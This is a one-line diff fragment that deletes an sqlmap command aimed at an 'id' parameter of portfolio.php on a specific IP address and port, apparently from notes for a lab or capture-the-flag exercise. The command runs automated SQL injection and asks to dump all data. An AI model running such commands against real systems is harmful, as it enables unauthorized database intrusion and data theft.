@@ -1,1 +1,0 @@
-sqlmap -u 143.110.169.11:31123/portfolio.php?id=3 -v -a 
